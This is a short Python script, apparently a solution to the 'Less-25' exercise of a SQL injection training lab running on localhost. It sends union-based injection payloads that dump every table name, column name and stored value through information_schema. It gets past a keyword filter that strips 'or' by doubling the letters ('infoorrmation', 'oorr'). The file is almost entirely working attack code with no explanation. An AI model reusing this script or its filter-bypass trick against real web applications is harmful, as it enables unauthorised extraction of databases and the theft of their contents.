import requests
import base64

get_table = "(select group_concat(table_name) from infoorrmation_schema.tables where table_schema= database())"
get_column = "(select group_concat(column_name) from infoorrmation_schema.columns where table_name = '{0}')"
get_secret = "(select group_concat({0}) from {1})"
url = "http://localhost:1234/Less-25/?id="
session = requests.Session()

payload = "' union select 1,{},'3"
response = requests.post(url+payload.format(get_table))
while('Subquery returns more than 1 row' in response.text):
    response = requests.post(url+payload.format(get_table))
temp = response.text[570:-312-len(payload.format(get_table))]
tables = temp.split(',')
for i in tables:
    print("From Table", i, ": ")
    find = get_column.format(i)
    response = requests.post(url+payload.format(find))
    while('Subquery returns more than 1 row' in response.text):
        response = requests.post(url+payload.format(find))
    temp = response.text[570:-312-len(payload.format(find))]
    columns = temp.split(',')
    print("Columns : ", *columns)
    for j in columns:
        print("From Column", j, ": ")
        find = get_secret.format(j, i).replace('or', 'oorr')
        response = requests.post(url+payload.format(find))
        while('Subquery returns more than 1 row' in response.text):
            response = requests.post(url+payload.format(find))
        print(response.text[570:-314-len(payload.format(find).replace('oorr', 'or'))])
